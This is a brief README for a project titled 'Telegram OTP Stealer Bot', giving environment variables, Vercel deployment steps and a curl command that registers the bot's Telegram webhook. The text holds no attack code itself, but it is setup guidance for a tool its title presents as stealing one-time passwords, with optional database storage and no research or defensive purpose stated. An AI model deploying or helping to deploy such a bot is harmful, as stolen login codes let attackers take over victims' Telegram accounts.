# Telegram OTP Stealer Bot

Deployable on Vercel with GitHub integration.

## Environment Variables

| Variable | Description |
|----------|-------------|
| API_ID | From my.telegram.org |
| API_HASH | From my.telegram.org |
| BOT_TOKEN | From @BotFather |
| SUPABASE_URL | Optional, for persistent storage |
| SUPABASE_KEY | Optional, for persistent storage |

## Deploy on Vercel

1. Push this code to GitHub
2. Import the repository on Vercel
3. Add environment variables
4. Deploy

## Set Webhook

After deployment:

```bash
curl "https://api.telegram.org/bot<BOT_TOKEN>/setWebhook?url=https://your-app.vercel.app/api/webhook"
